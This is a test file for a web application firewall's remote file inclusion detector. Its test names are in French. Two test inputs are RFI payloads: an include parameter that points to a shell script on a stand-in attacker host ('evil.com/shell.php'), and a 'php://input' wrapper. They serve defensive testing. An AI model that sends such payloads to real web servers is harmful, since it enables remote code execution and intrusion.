import { WAF } from "../../../src/core/waf";
import { rfiDetector } from "../../../src/detectors/http/rfi.detector";

describe("RFI Detector", () => {
  it("ne déclenche rien sur une URL normale", async () => {
    const waf = new WAF();
    waf.registerDetector(rfiDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "GET",
      url: "/api/user/profile",
      headers: {},
    });

    expect(decision.findings.length).toBe(0);
  });

  it("détecte une RFI http://", async () => {
    const waf = new WAF();
    waf.registerDetector(rfiDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "GET",
      url: "/?include=http://evil.com/shell.php",
      headers: {},
    });

    expect(decision.findings.length).toBe(1);
    expect(decision.findings[0].detector).toBe("rfi-detector");
  });

  it("détecte une RFI via php://input", async () => {
    const waf = new WAF();
    waf.registerDetector(rfiDetector);

    await waf.init();

    const decision = await waf.evaluate({
      method: "GET",
      url: "/?src=php://input",
      headers: {},
    });

    expect(decision.findings.length).toBe(1);
  });
});
